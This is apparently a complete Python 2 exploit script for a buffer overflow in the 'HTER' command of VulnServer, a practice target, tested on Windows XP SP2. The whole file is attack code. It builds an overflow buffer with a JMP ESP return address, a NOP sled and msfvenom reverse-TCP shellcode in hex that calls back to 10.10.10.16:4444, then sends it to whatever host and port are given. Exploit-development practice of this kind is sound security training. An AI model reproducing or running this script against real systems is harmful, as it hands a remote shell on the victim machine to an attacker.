#!/usr/bin/env python
"""
Description: Vanilla Buffer Overflow via "HTER" in VulnServer
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 10/05/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 9999
"""

import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# 0x625011AF| JMP ESP | essfunc.dll

jmp_esp = "AF115062"

# Gets converted to \x90

nopsled = "90"*16

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -b "\x00" -f hex
# x86/shikata_ga_nai chosen with final size 351

shellcode = "d9e5bd1deb9e27d97424f4582bc9b15231681783e8fc0375f87cd27916021d81e7639764d6a3c3ed491487a365dfc557fdadc158b6183457473004f6cb4b59d8f283ac1932f95d4beb75f37b98c0c8f0d2c548e5a3e479b8b8be593b6ccbd32371f6aad8418c2c08986d8275149cdab2937fa9cae702aa0995d83f893daa9875bf7f7efeb334f458d0cbd9d3ec40dc336512fb972dc0628e8ba79bd073173e9b9e4c33c6f6a17ef806ae098b3471a20375fa6cd47ad1c94a85da2943428e79fb63af11fb8c7ab5ab22d5761b83851e710cf93f7ac692aa818196208341cf36937053be75187b962eb5e2b3a424ea69c167609e362981eb24de61a616497d1c3e15ecfbbe500d54e935e3ad7fa85a049d313a6f25eeff6ea463bb54b6bd44d1e211138f5cd4cd61368ea22bde5789eb9857c49d44e9b1db7bc655ec043ac613dffef6597d569f0714eac2b7c329fb3be1d1f82480d445e379a5d6867d1ad682"

buffer = "HTER "
buffer += "A"*2041
buffer += jmp_esp
buffer += nopsled
buffer += shellcode
buffer += "C"*(1951-len(jmp_esp)-len(nopsled)-len(shellcode))

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send(buffer)
    s.close()
except:
    print "[-] Something went wrong :("